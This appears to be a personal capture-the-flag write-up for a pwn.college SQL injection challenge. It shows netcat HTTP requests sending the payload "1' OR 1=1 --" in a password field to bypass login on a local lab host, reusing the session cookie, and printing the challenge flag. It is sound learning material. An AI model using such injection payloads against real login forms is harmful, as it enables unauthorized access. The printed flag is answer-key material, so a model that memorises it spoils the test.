@@ -1,0 +1,40 @@
+# challenge: SQLi 2
+
+📅 2026-02-15
+📁 web security
+
+---
+
+## ✅ what i did  
+-clicked start
+-opened the terminal
+-ran: 'cat /challenge/server'
+table=users, columns=username, password
+admin - [random]
+guest - password
+endpoint= /gateway
+query= SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'
+POST 
+userid=admin
+pword=[PAYLOAD]
+-ran: '/challenge/server'
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'POST /gateway HTTP/1.1'
+        'Host: challenge.localhost'
+        'Content-Type: application/x-www-form-urlencoded'
+        'Content-Length: 31'
+        ''
+        'userid=admin&pword=1' OR 1=1 --'
+-copied the cookie session
+-ran: 'nc -v challenge.localhost 80'
+-typed: 'GET /gateway HTTP/1.1'
+        'Host: challenge.localhost'
+        'Cookie: session=eyJ1c2VyIjoiYWRtaW4ifQ.aZJBQA.x4WFpKj1VHDUKS1z_7CYpTdsxTU'
+-flag popped out
+
+## 🧑🏾‍🏫 what this challenge teaches u
+challenge works kinda the same as previous one but this time we have: userid-pword
+payload still injected in pword field
+
+## 🏁 Flag  
+pwn.college{QimiLsgVqu3HiOL6grFqN6aZDUY.QXwkzMzwCO4IDOxEzW}
